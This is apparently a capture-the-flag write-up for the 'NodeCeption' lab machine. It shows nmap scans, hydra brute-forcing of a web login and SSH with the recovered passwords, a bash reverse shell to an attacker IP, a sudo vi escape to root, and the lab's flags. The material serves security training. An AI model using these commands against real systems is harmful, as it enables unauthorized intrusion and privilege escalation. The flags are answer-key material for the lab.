# NodeCeption [https://labs.thehackerslabs.com/machine/118]

# Description

```

    Gross force against the web authentication form (login.php) using policy-filtered credentials (min. 8 characters, number, and capital).
    Access to the web panel with valid user.
    N8n instance operation to achieve remote command execution (RCE) by creating a workflow that launches a reverse shell.
    Getting shell as a user thland improvement of terminal environment for stability.
    Sudo permission enumeration (sudo -l) to identify execution of vino password.
    Exploitation of vivia GTFOBins to get privileged shell (root).
```

# Nmap Scan Result

```
$ sudo nmap -sCV -p- 192.168.1.55

Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-14 00:18 GMT
Nmap scan report for nodeception.powerhub (192.168.1.55)
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)

PORT     STATE SERVICE VERSION

22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 67:df:2b:e6:48:16:ec:91:b1:a6:67:25:37:05:fc:0f (ECDSA)
|_  256 dc:ab:74:b7:be:b5:49:6a:c8:7b:db:6b:7c:91:73:69 (ED25519)
8765/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 08:00:27:7B:7A:B5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.95 seconds
```

```
$ sudo nmap -sCV -Pn 192.168.1.55
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-14 00:53 GMT
Nmap scan report for nodeception.powerhub (192.168.1.55)
Host is up (0.00025s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 67:df:2b:e6:48:16:ec:91:b1:a6:67:25:37:05:fc:0f (ECDSA)
|_  256 dc:ab:74:b7:be:b5:49:6a:c8:7b:db:6b:7c:91:73:69 (ED25519)
5678/tcp open  rrac?
```

```
$ sudo nmap -Pn -p- 192.168.1.55
[sudo] password for tutu: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-14 01:14 GMT
Nmap scan report for nodeception.powerhub (192.168.1.55)
Host is up (0.00011s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5678/tcp open  rrac
8765/tcp open  ultraseek-http
MAC Address: 08:00:27:7B:7A:B5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds

```

# Login Bruteforcing

```
$ hydra -l usuario@maildelctf.com -P /usr/share/wordlists/rockyou.txt 192.168.1.55 -s 8765 http-post-form "/login.php:email=^USER^&password=^PASS^:F=incorrectas"

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-14 00:49:58
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.1.55:8765/login.php:email=^USER^&password=^PASS^:F=incorrectas
[8765][http-post-form] host: 192.168.1.55   login: usuario@maildelctf.com   password: Password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-14 00:50:46
```
# User Flag

```
thl@nodeception:~$ cat user.txt
cat user.txt
THL_wdYkVpXlqNaEUhRJfzbtHm
thl@nodeception:~$ 

```

# Rev Shell

```
bash -c "bash -i >& /dev/tcp/192.168.1.60/5000 0>&1"
```

sudo /usr/bin/vi -c ':!/bin/sh' /dev/null


# SSH Bruteforcing

```
$ hydra -l thl -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.55
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-14 01:10:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.1.55:22/
[22][ssh] host: 192.168.1.55   login: thl   password: basketball
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-14 01:10:35
```

# Root Flag

```
thl@nodeception:~$ sudo /usr/bin/vi -c ':!/bin/sh' /dev/null
[sudo] password for thl: 

# cd /root
# ls
root.txt
# cat root.txt
THL_QzXeoMuYRcJtWHabnLKfgDi
# 
```

